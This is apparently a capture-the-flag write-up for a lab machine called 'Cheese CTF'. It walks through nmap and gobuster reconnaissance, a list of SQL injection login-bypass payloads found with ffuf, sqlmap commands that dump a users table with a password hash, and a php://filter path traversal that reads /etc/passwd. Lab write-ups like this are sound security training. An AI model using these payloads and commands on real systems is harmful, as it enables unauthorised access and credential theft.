# Cheese CTF       


## ``nmap scan``

```
nmap -sCV 10.10.0.223
```

![image](https://github.com/user-attachments/assets/c6f79a9d-c448-47f2-9fd6-1ba6289318e0)



## ``gobuster``

```
gobuster dir -u http://10.10.0.223/ -w /home/kali/Downloads/wordlists/directory-list-2.3-medium.txt
```

![image](https://github.com/user-attachments/assets/6ad6f0aa-b52b-42d5-bc70-7a7b89d02d90)





## ``ffuf``
> you can sue ``ffuf`` to fuzz and bypass login page :

```
ffuf -w SQL_login_bypass.txt -X POST -u http://10.10.0.223/login.php -d 'username=FUZZ&password=asdf' -H "Content-Type: application/x-www-form-urlencoded; charset=UTF-8" -fw 227
```

``found``

![image](https://github.com/user-attachments/assets/24c827a5-71b9-4e89-a18a-ebebe14f79fb)


```
' OR 'x'='x'#;          [Status: 302, Size: 792, Words: 217, Lines: 26, Duration: 166ms]
'-''-- 2                [Status: 302, Size: 792, Words: 217, Lines: 26, Duration: 92ms]
'-''#                   [Status: 302, Size: 792, Words: 217, Lines: 26, Duration: 98ms]
'^''-- 2                [Status: 302, Size: 792, Words: 217, Lines: 26, Duration: 96ms]
'^''#                   [Status: 302, Size: 792, Words: 217, Lines: 26, Duration: 96ms]
'*''-- 2                [Status: 302, Size: 792, Words: 217, Lines: 26, Duration: 95ms]
'*''#                   [Status: 302, Size: 792, Words: 217, Lines: 26, Duration: 95ms]
'=''-- 2                [Status: 302, Size: 792, Words: 217, Lines: 26, Duration: 95ms]
'=''#                   [Status: 302, Size: 792, Words: 217, Lines: 26, Duration: 108ms]
'oR'2'LiKE'2'-- 2       [Status: 302, Size: 792, Words: 217, Lines: 26, Duration: 105ms]
'oR'2'LiKE'2'#          [Status: 302, Size: 792, Words: 217, Lines: 26, Duration: 117ms]
' UniON SElecT 1,2,3-- 2 [Status: 302, Size: 792, Words: 217, Lines: 26, Duration: 97ms]
' UniON SElecT 1,2,3#   [Status: 302, Size: 792, Words: 217, Lines: 26, Duration: 97ms]
'UniON(SElecT(1),2,3)-- 2 [Status: 302, Size: 792, Words: 217, Lines: 26, Duration: 93ms]
'UniON(SElecT(1),2,3)#  [Status: 302, Size: 792, Words: 217, Lines: 26, Duration: 106ms]
'||2-- 2                [Status: 302, Size: 792, Words: 217, Lines: 26, Duration: 94ms]
'||'2'||'               [Status: 302, Size: 792, Words: 217, Lines: 26, Duration: 93ms]
'||2#                   [Status: 302, Size: 792, Words: 217, Lines: 26, Duration: 94ms]
'||2||'                 [Status: 302, Size: 792, Words: 217, Lines: 26, Duration: 99ms]
'||'2'='2'||'           [Status: 302, Size: 792, Words: 217, Lines: 26, Duration: 92ms]
'||2=2-- 2              [Status: 302, Size: 792, Words: 217, Lines: 26, Duration: 93ms]
'||2=2#                 [Status: 302, Size: 792, Words: 217, Lines: 26, Duration: 92ms]
'||2=2||'               [Status: 302, Size: 792, Words: 217, Lines: 26, Duration: 92ms]
'||true||'              [Status: 302, Size: 792, Words: 217, Lines: 26, Duration: 114ms]
'||true-- 2             [Status: 302, Size: 792, Words: 217, Lines: 26, Duration: 114ms]
'||'2'LiKE'2'-- 2       [Status: 302, Size: 792, Words: 217, Lines: 26, Duration: 98ms]
'||'2'LiKE'2'#          [Status: 302, Size: 792, Words: 217, Lines: 26, Duration: 98ms]
'||true#                [Status: 302, Size: 792, Words: 217, Lines: 26, Duration: 114ms]
'||'2'LiKE'2'||'        [Status: 302, Size: 792, Words: 217, Lines: 26, Duration: 96ms]
'||(2)LiKE(2)-- 2       [Status: 302, Size: 792, Words: 217, Lines: 26, Duration: 97ms]
'||(2)LiKE(2)#          [Status: 302, Size: 792, Words: 217, Lines: 26, Duration: 92ms]
'||(2)LiKE(2)||'        [Status: 302, Size: 792, Words: 217, Lines: 26, Duration: 95ms]
%A8%27||1-- 2           [Status: 302, Size: 792, Words: 217, Lines: 26, Duration: 136ms]
%bf'||1-- 2             [Status: 302, Size: 792, Words: 217, Lines: 26, Duration: 133ms]
%8C%A8%27||1-- 2        [Status: 302, Size: 792, Words: 217, Lines: 26, Duration: 133ms]
:: Progress: [804/804] :: Job [1/1] :: 334 req/sec :: Duration: [0:00:05] :: Errors: 0 ::
```





----
----

<details>
   <summary>inject manual</summary>

> first try ``' or 1=1; -- -`` but not work

``try union``

```
' union select 1 -- -
' union select 1,2 -- -
' union select 1,2,3 -- -
```
and Boom!!! 

it work on 3 columns and bypassed login 

> if you try to extract data from this and appear database content it will not apper ✅ SQLi exists, ❌ but data can’t be extracted via this page.

</details>

----
----


## ``SQLmap``

```
sqlmap -u "http://10.10.0.223/login.php" --data="username=admin&password=pass" --level=5 --risk=3 --threads=5 --dbs
```

``found databases``

```
available databases [2]:
[*] information_schema
[*] users
```

![image](https://github.com/user-attachments/assets/826eb9e0-20b7-4a08-a192-213def942148)


``find tables in users database``

```
sqlmap -u "http://10.10.0.223/login.php" --data="username=admin&password=pass" -D users --tables
```

``found users table``

![image](https://github.com/user-attachments/assets/36fa6cb3-89fb-493b-8c00-afb08453340c)


``get content of users``

```
sqlmap -u "http://10.10.0.223/login.php" --data="username=admin&password=pass" -D users -T users --dump
```

![image](https://github.com/user-attachments/assets/dddc5c59-a882-4c82-b594-6f474d955d26)

```
retrieved: 5b0c2e1b4fe1410e47f26feff7f4fc4c
retrieved: comte
```
```
+----+----------------------------------+----------+
| id | password                         | username |
+----+----------------------------------+----------+
| 1  | 5b0c2e1b4fe1410e47f26feff7f4fc4c | comte    |
+----+----------------------------------+----------+
```


> ### tryed to hash password but not found crack to it so try to found another way to get in system


## ``path traversal``

after bypass login page found :


![image](https://github.com/user-attachments/assets/51963ef7-59a5-4c25-8bfa-81317651aa83)

try to make url like ``http://10.10.0.223/secret-script.php?file=php://filter/resource=../../../../etc/passwd`` found

![image](https://github.com/user-attachments/assets/9231f3b9-6553-4b70-b9db-40bb92ee361a)

Boom !!!

> notice we found in /etc/passwd our user we found ``comte``





